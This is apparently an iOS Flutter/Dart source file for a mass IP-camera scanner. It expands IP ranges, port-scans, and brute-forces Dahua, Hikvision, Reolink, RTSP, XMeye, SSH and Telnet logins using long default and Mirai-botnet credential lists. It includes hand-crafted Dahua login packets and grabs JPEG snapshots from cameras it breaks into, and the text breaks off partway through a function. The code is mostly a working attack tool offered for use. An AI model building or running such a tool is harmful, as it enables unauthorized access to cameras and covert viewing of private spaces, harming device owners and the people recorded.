// [context: Flutter/Dart 3.13.5, iOS-only, dart:io raw TCP, no pwntools/metasploit]
// *the engine — every packet hand-crafted from first principles, mirrors DahuaScanner.kt byte for byte*

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:typed_data';
import 'package:crypto/crypto.dart';
import '../models/scan_result.dart';

// ══════════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ══════════════════════════════════════════════════════════════════════════════

const _kDefaultPort      = 37777;
const _kTimeoutConnect   = Duration(milliseconds: 2500);
const _kTimeoutRead      = Duration(milliseconds: 5000);
const _kTimeoutSnapshot  = Duration(milliseconds: 4000);
const _kTimeoutHttp      = Duration(milliseconds: 5000);
const _kTimeoutPort      = Duration(milliseconds: 1200);
const _kMaxConcurrent    = 80;

/// Full 40-port list from DahuaScanner.kt
const kAllPorts = [
  37777, 80, 81, 82, 83, 84, 85, 88, 443, 554, 2051, 3500,
  7447, 8000, 8001, 8080, 8081, 8085, 8086, 8088, 8089, 8090, 8181, 8443, 8554,
  8765, 8888, 8899, 9000, 9090, 10554, 34567, 22, 23, 2323, 5554, 8186, 49152, 55555
];

const _kHttpsPortSet = {443, 8443};
const _kHttpPorts    = [80, 8080, 8000, 8089, 8899, 8081, 8088, 9000, 8888, 443, 8443,
                        81, 85, 88, 82, 83, 84, 8090, 8086, 8085, 8181, 8765, 3500, 2051];
const _kRtspPorts    = [554, 5554, 8554, 10554, 8000, 8080, 8090, 8081, 8088, 8086, 49152];

// ══════════════════════════════════════════════════════════════════════════════
// CREDENTIALS
// ══════════════════════════════════════════════════════════════════════════════

const _kCredentials = [
  ['admin',''],       ['admin','admin'],   ['admin','123456'],
  ['admin','12345'],  ['admin','admin123'],['admin','1234'],
  ['admin','888888'], ['admin','666666'],  ['admin','000000'],
  ['admin','password'],['admin','pass'],  ['admin','54321'],
  ['admin','654321'], ['admin','abc123'],  ['admin','qwerty'],
  ['admin','111111'], ['admin','123123'],  ['admin','1111'],
  ['admin','abc'],    ['admin','camera'],  ['admin','ipc'],
  ['admin','Admin'],  ['admin','Admin123'],['admin','Admin@123'],
  ['888888','888888'],['666666','666666'], ['root','root'],
  ['root',''],        ['root','123456'],   ['root','admin'],
  ['root','pass'],    ['root','1234'],     ['root','password'],
  ['guest','guest'],  ['guest',''],        ['guest','123456'],
  ['user','user'],    ['user',''],         ['user','123456'],
  ['admin1','admin1'],['administrator',''],['supervisor','supervisor'],
  ['service','service'],['default','default'],['support','support'],
  ['operator','operator'],['viewer','viewer'],['monitor','monitor'],
  ['tech','tech'],    ['installer','installer'],
  ['1111111','1111111'],['123456','123456'],['654321','654321'],
];

const _kHttpCredentials = [
  ['admin',''],       ['admin','admin'],   ['admin','123456'],
  ['admin','12345'],  ['admin','admin123'],['admin','1234'],
  ['admin','888888'], ['admin','666666'],  ['admin','000000'],
  ['admin','password'],['admin','pass'],  ['admin','54321'],
  ['admin','654321'], ['admin','abc123'],  ['admin','qwerty'],
  ['admin','111111'], ['admin','123123'],  ['admin','1111'],
  ['888888','888888'],['666666','666666'], ['root','root'],
  ['root',''],        ['root','123456'],   ['root','admin'],
  ['guest','guest'],  ['guest',''],        ['user','user'],
  ['user',''],        ['supervisor','supervisor'],
  // Hikvision-specific
  ['admin','Admin1234'],['admin','Admin@123'],['admin','Hik12345'],
  ['admin','Hik@12345'],['admin','Admin123'], ['admin','admin12345'],
  ['admin','Admin@2019'],['admin','Admin@2020'],['admin','Admin@2021'],
  ['admin','Admin@2022'],['admin','Admin@2023'],['admin','Admin@2024'],
  // Dahua yearly
  ['admin','dahua2019'],['admin','dahua2020'],['admin','dahua2021'],
  ['admin','dahua2022'],['admin','Dahua@123'],['admin','admin2019'],
  ['admin','admin2020'],['admin','admin2021'],['admin','admin2022'],
  ['admin','admin2023'],['admin','admin2024'],
  // Reolink
  ['admin','reolink'],['admin','Reolink123'],
  // Uniview
  ['admin','Admin@123'],['admin','admin@123'],
  // Axis
  ['root','pass'],['root','axis2400'],['admin','axis'],
  // Imou/Lechange
  ['admin','imou1234'],['admin','Imou@123'],['admin','lechange'],
  // Tiandy
  ['admin','tiandy'],['admin','Tiandy123'],
  // TVT
  ['admin','tvt'],['admin','tvt2000'],
  // Chinese OEM DVR
  ['admin','abc123'],['admin','abcdef'],['admin','123abc'],
  ['admin','a12345'],['admn','1234'],['default','tluafed'],['default',''],
  // ONVIF
  ['service','Service123'],['service',''],['onvif','onvif'],
  // Mirai HTTP
  ['admin','xc3511'],['admin','vizxv'],['admin','juantech'],
  ['admin','realtek'],['admin','dreambox'],['admin','jin2394%'],
  ['admin','EMPIREII'],['admin','zlxx.'],['admin','Zte521'],
  ['root','xc3511'],['root','vizxv'],['root','juantech'],
  ['root','realtek'],['root','dreambox'],['root','zlxx.'],
  ['root','7ujMko0admin'],['root','7ujMko0vizxv'],
  // Herospeed/Longse
  ['admin','longse'],['admin','Longse123'],
  // Honeywell
  ['admin','honeywell'],['service','honeywellservice'],
  // Annke/Swann/ZOSI/Lorex
  ['admin','annke'],['admin','swann'],['admin','admin888'],
  ['admin','zosi'],['admin','lorex'],
  // CPPlus/Intelbras
  ['admin','cpplus'],['admin','Cpplus@123'],['admin','intelbras'],
  // Samsung/Sony/Panasonic
  ['admin','samsung'],['admin','Samsung@123'],['admin','4321'],
  ['admin','sony'],['admin','Sony123'],
  ['admin','panasonic'],['admin','12345'],
  // Bosch/Hanwha/Pelco
  ['service','service'],['admin','bosch'],
  ['admin','no-password'],['admin','hanwha'],['admin','pelco'],
  // FLIR/Mobotix/Vivotek/Foscam
  ['admin','fliradmin'],['admin','flir'],
  ['admin','meinsm'],['admin','mobotix'],
  ['root',''],['root','root'],
  ['admin',''],['admin','foscam'],
  // Generic extras
  ['user1','user1'],['admin','Admin'],['admin','system'],
  ['admin','manager'],['admin','999999'],['admin','12341234'],
  ['admin','111222'],['admin','123321'],['Admin','Admin'],
  ['Admin',''],['administrator','administrator'],
];

const _kSshCredentials = [
  ['root','root'],   ['root',''],        ['root','vizxv'],
  ['root','xc3511'], ['root','juantech'],['root','dreambox'],
  ['root','realtek'],['root','7ujMko0admin'],['root','7ujMko0vizxv'],
  ['root','7ujMko0'],['root','klv1234'], ['root','pass'],
  ['root','1234'],   ['root','12345'],   ['root','123456'],
  ['root','admin'],  ['root','password'],['root','toor'],
  ['root','linux'],  ['root','alpine'],  ['root','raspberry'],
  ['root','zlxx.'],  ['root','jin2394%'],['root','anko'],
  ['root','hi3518'], ['root','hi3520'],  ['root','ingenic'],
  ['admin','admin'], ['admin',''],       ['admin','123456'],
  ['admin','12345'], ['admin','1234'],   ['admin','password'],
  ['admin','admin123'],['admin','vizxv'],['admin','xc3511'],
  ['admin','juantech'],['admin','realtek'],['admin','dreambox'],
  ['admin','888888'],['admin','666666'], ['admin','abc123'],
  ['ubnt','ubnt'],   ['pi','raspberry'], ['pi','pi'],
  ['pi','root'],     ['pi','3.14159'],
  ['test','test'],   ['test',''],        ['test','1234'],
  ['guest','guest'], ['guest',''],       ['guest','12345'],
  ['user','user'],   ['user',''],
  ['admin1','admin1'],['admin1','1234'],
  ['support','support'],['support',''], ['support','1234'],
  ['service','service'],['service',''], ['service','S3rv1c3'],
  ['supervisor','supervisor'],
  ['operator','operator'],['operator',''],
  ['cisco','cisco'], ['cisco',''],
  ['oracle','oracle'],['debian','debian'],
  ['vagrant','vagrant'],['ftpuser','ftpuser'],
  ['ftp','ftp'],     ['backup','backup'],
  ['ec2-user',''],   ['ubuntu',''],      ['centos',''],
  ['anonymous',''],  ['Admin','Admin'],  ['Admin',''],
  ['Administrator',''],['Administrator','Administrator'],
  ['default','default'],['default',''],
  ['dvr','dvr'],     ['ipc','ipc'],      ['nvr','nvr'],
  ['tech','tech'],   ['daemon','daemon'],
];

// ══════════════════════════════════════════════════════════════════════════════
// RTSP routes (28) & credentials (30)
// ══════════════════════════════════════════════════════════════════════════════

const _kRtspRoutes = [
  '/Streaming/Channels/101',
  '/h264/ch1/main/av_stream',
  '/cam/realmonitor?channel=1&subtype=0',
  '/live/main',
  '/stream1',
  '/live.sdp',
  '/axis-media/media.amp',
  '/onvif1',
  '/11',
  '/ch0_0.h264',
  '/mpeg4/media.amp',
  '/video1',
  '/stream',
  '/main',
  '/live',
  '/play1.sdp',
  '/av0_0',
  '/live/ch00_0',
  '/cam/realmonitor?channel=1&subtype=1',
  '/live0',
  '/video.mp4',
  '/channel1',
  '/media/video1',
  '/live/mpeg4',
  '/0',
  '/live/h264',
  '/media.amp',
  '/streaming/channels/1',
];

const _kRtspCredentials = [
  ['',''],       ['','admin'],  ['admin','admin'],  ['admin','12345'],
  ['admin','123456'],['admin',''],['root',''],['root','root'],
  ['user',''],   ['guest',''],  ['supervisor','supervisor'],
  ['888888','888888'],['666666','666666'],['admin','888888'],
  ['admin','666666'],['admin','admin123'],['admin','1234'],
  ['admin','password'],['admin','vizxv'],['admin','xc3511'],
  ['admin','realtek'],['admin','abc123'],['admin','000000'],
  ['admin','111111'],['admin','12341234'],['admin','Admin@123'],
  ['admin','Admin1234'],['root','vizxv'],['root','xc3511'],
  ['root','123456'],
];

// ══════════════════════════════════════════════════════════════════════════════
// WEB PANEL BLOCKLIST
// ══════════════════════════════════════════════════════════════════════════════

const _kWebPanelBlocklist = [
  'grafana','jenkins','tomcat','kibana','elasticsearch',
  'prometheus','portainer','rancher','kubernetes','docker',
  'rabbitmq','redis','mongodb','mysql','postgresql',
  'nginx','apache','iis','phpmyadmin','wordpress',
  'jira','confluence','gitlab','gitea','nexus',
  'sonarqube','zabbix','nagios','icinga','opnsense',
  'pfsense','proxmox','esxi','vcenter','truenas',
  'synology','qnap','openhab','homeassistant','nodered',
];

// ══════════════════════════════════════════════════════════════════════════════
// IP RANGE EXPANSION
// ══════════════════════════════════════════════════════════════════════════════

List<String> expandIpRange(String input) {
  final result = <String>[];
  for (final line in input.split('\n')) {
    final t = line.trim();
    if (t.isEmpty) continue;
    if (t.contains('/')) {
      result.addAll(_expandCidr(t));
    } else if (t.contains('-')) {
      result.addAll(_expandDash(t));
    } else if (_isValidIp(t)) {
      result.add(t);
    }
  }
  return result;
}

List<String> _expandCidr(String cidr) {
  try {
    final parts  = cidr.split('/');
    final prefix = int.parse(parts[1]);
    final octs   = parts[0].split('.').map(int.parse).toList();
    final base   = (octs[0] << 24) | (octs[1] << 16) | (octs[2] << 8) | octs[3];
    final mask   = prefix == 0 ? 0 : (~0 << (32 - prefix)) & 0xFFFFFFFF;
    final net    = base & mask;
    final count  = (1 << (32 - prefix)).clamp(0, 65536);
    return List.generate(count <= 2 ? 0 : count - 2, (i) {
      final a = net + i + 1;
      return '${(a>>24)&0xFF}.${(a>>16)&0xFF}.${(a>>8)&0xFF}.${a&0xFF}';
    });
  } catch (_) { return []; }
}

List<String> _expandDash(String range) {
  try {
    final parts     = range.split('-');
    final startIp   = parts[0].trim();
    final endPart   = parts[1].trim();
    final startOcts = startIp.split('.').map(int.parse).toList();
    final endOcts   = endPart.contains('.')
        ? endPart.split('.').map(int.parse).toList()
        : [...startOcts.sublist(0, 3), int.parse(endPart)];
    final start = (startOcts[0]<<24)|(startOcts[1]<<16)|(startOcts[2]<<8)|startOcts[3];
    final end   = (endOcts[0]<<24)|(endOcts[1]<<16)|(endOcts[2]<<8)|endOcts[3];
    if (end < start) return [];
    final count = (end - start + 1).clamp(0, 65536);
    return List.generate(count, (i) {
      final a = start + i;
      return '${(a>>24)&0xFF}.${(a>>16)&0xFF}.${(a>>8)&0xFF}.${a&0xFF}';
    });
  } catch (_) { return []; }
}

bool _isValidIp(String s) {
  final parts = s.split('.');
  if (parts.length != 4) return false;
  return parts.every((p) { final v = int.tryParse(p); return v != null && v >= 0 && v <= 255; });
}

// ══════════════════════════════════════════════════════════════════════════════
// SCANNER SERVICE
// ══════════════════════════════════════════════════════════════════════════════

class ScannerService {
  bool _cancelled = false;
  int  _checked   = 0, _success = 0, _blocked = 0, _openPorts = 0;

  void cancel() => _cancelled = true;
  bool get isCancelled => _cancelled;

  // ── quickPortScan: parallel TCP connect ──────────────────────────────────────
  Future<Set<int>> quickPortScan(String ip, List<int> ports) async {
    final open  = <int>{};
    final tasks = <Future>[];
    for (final port in ports) {
      tasks.add(() async {
        try {
          final s = await Socket.connect(ip, port, timeout: _kTimeoutPort);
          await s.close();
          open.add(port);
        } catch (_) {}
      }());
    }
    await Future.wait(tasks);
    return open;
  }

  // ── multi-phase scan pipeline ────────────────────────────────────────────────
  Future<ScanResult?> _scanSelectedPortsInternal(String ip, List<int> ports) async {
    if (_cancelled) return null;

    final openPorts = await quickPortScan(ip, ports);
    if (openPorts.isEmpty || _cancelled) return null;
    _openPorts += openPorts.length;

    // Phase 1: Dahua binary 37777
    if (openPorts.contains(_kDefaultPort)) {
      final r = await _tryCredentials(ip, _kDefaultPort);
      if (r != null) return r;
    }
    if (_cancelled) return null;

    // Phase 2: HTTP camera
    for (final port in _kHttpPorts.where((p) => openPorts.contains(p))) {
      if (_cancelled) return null;
      final r = await _tryHttpCamera(ip, port);
      if (r != null) return r;
    }

    // Phase 3: RTSP
    for (final port in _kRtspPorts.where((p) => openPorts.contains(p))) {
      if (_cancelled) return null;
      final r = await _tryRtspAuth(ip, port);
      if (r != null) return r;
    }

    // Phase 4: XMeye 34567
    if (openPorts.contains(34567)) {
      final r = await _tryXMeye(ip);
      if (r != null) return r;
    }
    if (_cancelled) return null;

    // Phase 5: SSH banner
    if (openPorts.contains(22)) {
      final r = await _trySsh(ip);
      if (r != null) return r;
    }
    if (_cancelled) return null;

    // Phase 6: Telnet
    for (final tPort in [23, 2323]) {
      if (openPorts.contains(tPort)) {
        final r = await _tryTelnet(ip, tPort);
        if (r != null) return r;
      }
    }
    return null;
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // DAHUA BINARY PROTOCOL (37777) — mirrors DahuaScanner.kt tryCredentials()
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _tryCredentials(String ip, int port) async {
    try {
      final s = await Socket.connect(ip, port, timeout: _kTimeoutConnect);
      await s.close();
    } catch (_) { return null; }

    for (final cred in _kCredentials) {
      if (_cancelled) return null;
      Socket? socket;
      try {
        socket = await Socket.connect(ip, port, timeout: _kTimeoutConnect);
        socket.setOption(SocketOption.tcpNoDelay, true);

        final status = await _sendLogin(socket, cred[0], cred[1]);

        if (status == _AuthStatus.blocked) {
          await socket.close();
          return ScanResult(ip: ip, port: port, login: cred[0], password: cred[1],
              model: '', channels: 0, snapshot: null, blocked: true, brand: 'Dahua');
        }
        if (status != _AuthStatus.success) {
          await socket.close();
          continue;
        }

        final model    = await _getModel(socket).catchError((_) => 'unknown');
        final channels = await _getChannelsCount(socket).catchError((_) => 1);

        for (int ch = 0; ch < channels.clamp(1, 4); ch++) {
          final photo = await _getSnapshot(socket, ch).catchError((_) => null as Uint8List?);
          if (photo != null && photo.length > 100) {
            await socket.close();
            return ScanResult(ip: ip, port: port, login: cred[0], password: cred[1],
                model: model, channels: channels, snapshot: photo, brand: 'Dahua');
          }
        }
        await socket.close();
        return ScanResult(ip: ip, port: port, login: cred[0], password: cred[1],
            model: model, channels: channels, snapshot: null, brand: 'Dahua');
      } catch (_) {
        try { await socket?.close(); } catch (_) {}
      }
    }
    return null;
  }

  // ── sendLogin: mirrors DahuaScanner.kt sendLogin() byte-perfect ──────────────
  Future<_AuthStatus> _sendLogin(Socket socket, String login, String password) async {
    final loginBytes = ascii.encode(login);
    final passBytes  = ascii.encode(password);
    final totalLen   = 24 + loginBytes.length + passBytes.length;
    if (totalLen > 127) return _AuthStatus.fail;

    final loginPadded = Uint8List(8);
    final passPadded  = Uint8List(8);
    for (int i = 0; i < loginBytes.length && i < 8; i++) loginPadded[i] = loginBytes[i];
    for (int i = 0; i < passBytes.length  && i < 8; i++) passPadded[i]  = passBytes[i];

    final ts     = (DateTime.now().millisecondsSinceEpoch ~/ 1000).toString();
    final tBytes = ascii.encode(ts);

    final buf = BytesBuilder();
    buf.add([0xa0, 0x00, 0x00, 0x60]);
    buf.add([totalLen]);
    buf.add([0x00, 0x00, 0x00]);
    buf.add(loginPadded);
    buf.add(passPadded);
    buf.add([0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa]);
    buf.add(loginBytes);
    buf.add(ascii.encode('&&'));
    buf.add(passBytes);
    buf.add([0x00]);
    buf.add(ascii.encode('Random:'));
    buf.add(tBytes);
    buf.add(ascii.encode('\r\n\r\n'));

    socket.add(buf.toBytes());
    await socket.flush();

    final resp = await _readExact(socket, 10, _kTimeoutRead);
    if (resp == null || resp.length < 10) return _AuthStatus.fail;
    if (resp[8] == 0) return _AuthStatus.success;
    if (resp[8] == 1 && resp[9] == 4) return _AuthStatus.blocked;
    return _AuthStatus.fail;
  }

  Future<String> _getModel(Socket socket) async {
    final cmd = Uint8List(32);
    cmd[0] = 0xa4; cmd[8] = 0x0b;
    socket.add(cmd); await socket.flush();
    final data = await _receiveMsg(socket);
    if (data == null || data.isEmpty) return 'unknown';
    final z = data.indexOf(0x00);
    return ascii.decode(z > 0 ? data.sublist(0, z) : data, allowInvalid: true).trim();
  }

  Future<int> _getChannelsCount(Socket socket) async {
    final cmd = Uint8List(32);
    cmd[0] = 0xa8; cmd[8] = 0x01;
    socket.add(cmd); await socket.flush();
    final data = await _receiveMsg(socket);
    if (data == null || data.isEmpty) return 1;
    return '&&'.allMatches(ascii.decode(data, allowInvalid: true)).length + 1;
  }

  Future<Uint8List?> _receiveMsg(Socket socket) async {
    final header = await _readExact(socket, 32, _kTimeoutRead);
    if (header == null || header.length < 6) return null;
    final length = ((header[5] & 0xFF) << 8) | (header[4] & 0xFF);
    if (length <= 0 || length > 65535) return null;
    return _readExact(socket, length, _kTimeoutRead);
  }

  // ── getSnapshot: mirrors DahuaScanner.kt getSnapshot() ───────────────────────
  Future<Uint8List?> _getSnapshot(Socket socket, int channelId) async {
    final ch  = channelId & 0xFF;
    final cmd = Uint8List.fromList([
      0x11,0x00,0x00,0x00, 0x28,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, 0x0a,0x00,0x00,0x00,
      ch,  0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, ch,  0x00,0x00,0x00,
      0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    ]);
    socket.add(cmd); await socket.flush();

    final buf      = BytesBuilder();
    bool first     = true;
    final deadline = DateTime.now().add(_kTimeoutSnapshot);

    final completer = Completer<void>();
    late StreamSubscription<Uint8List> sub;
    sub = socket.listen((chunk) {
      if (first) {
        if (chunk.length > 32) buf.add(chunk.sublist(32));
        first = false;
      } else {
        buf.add(chunk);
      }
      final data = buf.toBytes();
      if (_findMarker(data, 0xFF, 0xD9) != -1 || DateTime.now().isAfter(deadline)) {
        sub.cancel();
        if (!completer.isCompleted) completer.complete();
      }
    }, onError: (_) {
      sub.cancel();
      if (!completer.isCompleted) completer.complete();
    }, onDone: () {
      if (!completer.isCompleted) completer.complete();
    });

    await completer.future.timeout(_kTimeoutSnapshot, onTimeout: () {
      sub.cancel();
    });

    var data = buf.toBytes();
    data = _cleanGarbage(data, ch);
    final s = _findMarker(data, 0xFF, 0xD8);
    final e = _findMarker(data, 0xFF, 0xD9);
    if (s != -1 && e != -1 && s < e) {
      final jpeg = data.sublist(s, e + 2);
      return jpeg.length > 100 ? jpeg : null;
    }
    return null;
  }

  Uint8List _cleanGarbage(Uint8List data, int ch) {
    final g1 = Uint8List.fromList([0x0a, ch, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00]);
    final g2 = Uint8List.fromList([0xbc, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, ch]);
    var r = data;
    // remove g1 instances
    for (;;) {
      final p = _findPattern(r, g1);
      if (p == -1) break;
      r = _removeRange(r, (p - 24).clamp(0, r.length), (p + g1.length).clamp(0, r.length));
    }
    // remove g2 instances
    for (;;) {
      final p = _findPattern(r, g2);
      if (p == -1) break;
      r = _removeRange(r, p, (p + 32).clamp(0, r.length));
    }
    return r;
  }

  Uint8List _removeRange(Uint8List data, int from, int to) {
    if (from >= to || from < 0 || to > data.length) return data;
    final out = Uint8List(data.length - (to - from));
    out.setRange(0, from, data);
    out.setRange(from, out.length, data.sublist(to));
    return out;
  }

  int _findPattern(Uint8List data, Uint8List pat) {
    outer: for (int i = 0; i <= data.length - pat.length; i++) {
      for (int j = 0; j < pat.length; j++) {
        if (data[i + j] != pat[j]) continue outer;
      }
      return i;
    }
    return -1;
  }

  int _findMarker(Uint8List data, int b1, int b2) {
    for (int i = 0; i < data.length - 1; i++) {
      if (data[i] == b1 && data[i + 1] == b2) return i;
    }
    return -1;
  }

  // ── readExact with timeout ────────────────────────────────────────────────────
  Future<Uint8List?> _readExact(Socket socket, int size, Duration timeout) async {
    final buf       = Uint8List(size);
    int   off       = 0;
    final completer = Completer<Uint8List?>();

    late StreamSubscription<Uint8List> sub;
    sub = socket.listen((chunk) {
      final take = min(chunk.length, size - off);
      buf.setRange(off, off + take, chunk);
      off += take;
      if (off >= size) {
        sub.cancel();
        if (!completer.isCompleted) completer.complete(buf);
      }
    }, onError: (_) {
      sub.cancel();
      if (!completer.isCompleted) completer.complete(off > 0 ? buf.sublist(0, off) : null);
    }, onDone: () {
      if (!completer.isCompleted) completer.complete(off > 0 ? buf.sublist(0, off) : null);
    }, cancelOnError: true);

    Future.delayed(timeout).then((_) {
      sub.cancel();
      if (!completer.isCompleted) completer.complete(off > 0 ? buf.sublist(0, off) : null);
    });

    return completer.future;
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // HTTP CAMERA — detect brand → brand-specific auth
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _tryHttpCamera(String ip, int port) async {
    final brand = await _detectBrand(ip, port);
    if (brand == null) return null;

    for (final cred in _kHttpCredentials) {
      if (_cancelled) return null;
      final r = await _tryBrandAuth(ip, port, cred[0], cred[1], brand);
      if (r != null) return r;
    }
    return null;
  }

  Future<String?> _detectBrand(String ip, int port) async {
    final scheme = _kHttpsPortSet.contains(port) ? 'https' : 'http';
    final probes = ['/', '/login.htm', '/ISAPI/System/deviceInfo',
                    '/RPC2_Login', '/cgi-bin/magicBox.cgi?action=getDeviceType', '/Login.htm'];

    String server = '', wwwAuth = '', body = '', location = '';

    for (final path in probes) {
      try {
        final client = HttpClient()
          ..connectionTimeout = _kTimeoutConnect
          ..badCertificateCallback = (_, __, ___) => true;
        final req = await client.getUrl(Uri.parse('$scheme://$ip:$port$path')).timeout(_kTimeoutConnect);
        req.headers.set('User-Agent', 'Mozilla/5.0');
        final resp  = await req.close().timeout(_kTimeoutHttp);
        server      = resp.headers.value('server') ?? '';
        wwwAuth     = resp.headers.value('www-authenticate') ?? '';
        location    = resp.headers.value('location') ?? '';
        final bytes = await resp.toList().timeout(_kTimeoutHttp);
        body        = utf8.decode(bytes.expand((b) => b).take(4096).toList(), allowMalformed: true);
        client.close(force: true);
        if (server.isNotEmpty || wwwAuth.isNotEmpty || body.length > 50) break;
      } catch (_) {}
    }

    if (server.isEmpty && wwwAuth.isEmpty && body.isEmpty) return null;
    final all = (server + wwwAuth + body + location).toLowerCase();
    for (final bl in _kWebPanelBlocklist) { if (all.contains(bl)) return null; }
    return _matchBrand(server, wwwAuth, body, location);
  }

  String _matchBrand(String sv, String wa, String body, String loc) {
    final r = (sv + wa + body + loc).toLowerCase();
    if (r.contains('hikvision') || r.contains('hikdigital') || r.contains('isapi')) return 'Hikvision';
    if (r.contains('dahua') || r.contains('dh-') || r.contains('rpc2_login') || r.contains('magicbox')) return 'Dahua';
    if (r.contains('xmeye') || r.contains('xiongmai')) return 'XMeye';
    if (r.contains('uniview') || r.contains('unv') || r.contains('lapi/v1')) return 'Uniview';
    if (r.contains('reolink')) return 'Reolink';
    if (r.contains('axis') || r.contains('vapix')) return 'Axis';
    if (r.contains('imou') || r.contains('lechange')) return 'Imou';
    if (r.contains('tiandy')) return 'Tiandy';
    if (r.contains('tvt')) return 'TVT';
    if (r.contains('vivotek')) return 'Vivotek';
    if (r.contains('hanwha') || r.contains('wisenet')) return 'Hanwha';
    if (r.contains('bosch')) return 'Bosch';
    if (r.contains('pelco')) return 'Pelco';
    if (r.contains('acti')) return 'ACTi';
    if (r.contains('geovision') || r.contains('gvsdi')) return 'GeoVision';
    if (r.contains('milesight')) return 'Milesight';
    if (r.contains('mobotix')) return 'Mobotix';
    if (r.contains('grandstream')) return 'Grandstream';
    if (r.contains('sony')) return 'Sony';
    if (r.contains('samsung')) return 'Samsung';
    if (r.contains('panasonic') || r.contains('i-pro')) return 'Panasonic';
    if (r.contains('intelbras')) return 'Intelbras';
    if (r.contains('herospeed') || r.contains('longse')) return 'Herospeed';
    if (r.contains('honeywell')) return 'Honeywell';
    if (r.contains('flir')) return 'FLIR';
    if (r.contains('foscam')) return 'Foscam';
    if (r.contains('dlink') || r.contains('d-link') || r.contains('dcs-')) return 'DLink';
    if (r.contains('amcrest')) return 'Amcrest';
    if (r.contains('vstarcam')) return 'VStarcam';
    if (r.contains('dvr') || r.contains('nvr') || r.contains('ipc') ||
        r.contains('network camera') || r.contains('ip camera')) return 'Generic DVR';
    if (r.contains('realm') || r.contains('camera') || r.contains('cctv') || wa.isNotEmpty) return 'IP Camera';
    return 'IP Camera';
  }

  Future<ScanResult?> _tryBrandAuth(String ip, int port, String login, String password, String brand) async {
    switch (brand) {
      case 'Hikvision': return _tryHikvisionAuth(ip, port, login, password);
      case 'Dahua':     return _tryDahuaHttpAuth(ip, port, login, password);
      case 'Uniview':   return _tryUniviewAuth(ip, port, login, password);
      case 'Reolink':   return _tryReolinkAuth(ip, port, login, password);
      case 'Axis':      return _tryAxisAuth(ip, port, login, password);
      case 'Vivotek':   return _tryVivotekAuth(ip, port, login, password);
      case 'Hanwha':    return _tryHanwhaAuth(ip, port, login, password);
      case 'Bosch':     return _tryBoschAuth(ip, port, login, password);
      case 'GeoVision': return _tryGeoVisionAuth(ip, port, login, password);
      case 'ACTi':      return _tryACTiAuth(ip, port, login, password);
      case 'Grandstream': return _tryGrandstreamAuth(ip, port, login, password);
      case 'Sony':      return _trySonyAuth(ip, port, login, password);
      case 'Samsung':   return _trySamsungAuth(ip, port, login, password);
      case 'Panasonic': return _tryPanasonicAuth(ip, port, login, password);
      case 'Honeywell': return _tryHoneywellAuth(ip, port, login, password);
      case 'Herospeed': return _tryHerospeedAuth(ip, port, login, password);
      case 'Amcrest':   return _tryAmcrestAuth(ip, port, login, password);
      case 'CPPlus':    return _tryCPPlusAuth(ip, port, login, password);
      case 'Intelbras': return _tryIntelbrasAuth(ip, port, login, password);
      default:          return _tryBrandGenericAuth(ip, port, login, password, brand);
    }
  }

  Future<ScanResult?> _tryHikvisionAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/ISAPI/System/deviceInfo', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      final model = _extractXmlField(resp.body, 'model') ?? _extractXmlField(resp.body, 'deviceName') ?? 'Hikvision';
      final ch    = int.tryParse(_extractXmlField(resp.body, 'channelNum') ?? '1') ?? 1;
      final snap  = await _getHikvisionSnapshot(ip, port, l, p);
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: model, channels: ch, snapshot: snap, brand: 'Hikvision');
    } catch (_) { return null; }
  }

  Future<Uint8List?> _getHikvisionSnapshot(String ip, int port, String l, String p) async {
    for (final path in ['/ISAPI/Streaming/channels/101/picture',
                        '/ISAPI/Streaming/channels/1/picture',
                        '/Streaming/channels/1/picture',
                        '/cgi-bin/snapshot.cgi']) {
      try {
        final r = await _httpGet(ip, port, path, l, p);
        if (r != null && r.statusCode == 200 && r.bodyBytes.length > 500) {
          if (r.bodyBytes[0] == 0xFF && r.bodyBytes[1] == 0xD8) return r.bodyBytes;
        }
      } catch (_) {}
    }
    return null;
  }

  Future<ScanResult?> _tryDahuaHttpAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/magicBox.cgi?action=getDeviceType', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      final model = resp.body.split('=').last.trim();
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: model.isEmpty ? 'Dahua' : model, channels: 1, snapshot: null, brand: 'Dahua');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryUniviewAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/LAPI/V1.0/System/DeviceInfo', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      final model = _extractJsonField(resp.body, 'DeviceName') ?? 'Uniview';
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: model, channels: 1, snapshot: null, brand: 'Uniview');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryReolinkAuth(String ip, int port, String l, String p) async {
    try {
      final body = jsonEncode([{'cmd':'Login','param':{'User':{'userName':l,'password':p}}}]);
      final resp = await _httpPost(ip, port, '/cgi-bin/api.cgi?cmd=Login', body);
      if (resp == null || resp.statusCode != 200) return null;
      if (!resp.body.contains('"rspCode":200') && !resp.body.contains('"rspCode" : 200')) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Reolink', channels: 1, snapshot: null, brand: 'Reolink');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryAxisAuth(String ip, int port, String l, String p) async {
    try {
